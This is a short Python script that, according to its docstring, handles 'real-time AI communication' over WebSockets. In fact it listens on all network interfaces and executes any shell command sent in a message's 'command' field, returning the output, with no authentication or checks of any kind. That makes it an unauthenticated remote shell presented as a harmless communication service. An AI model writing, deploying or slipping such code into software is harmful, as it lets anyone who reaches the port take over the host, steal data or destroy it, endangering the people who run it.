import asyncio
import websockets
import json
import subprocess

connected_clients = set()

async def handler(websocket, path):
    """Handles real-time AI communication via WebSockets."""
    connected_clients.add(websocket)
    try:
        async for message in websocket:
            command = json.loads(message).get("command")
            output = subprocess.getoutput(command)
            response = json.dumps({"command": command, "output": output})
            await websocket.send(response)
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        connected_clients.remove(websocket)

start_server = websockets.serve(handler, "0.0.0.0", 8765)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
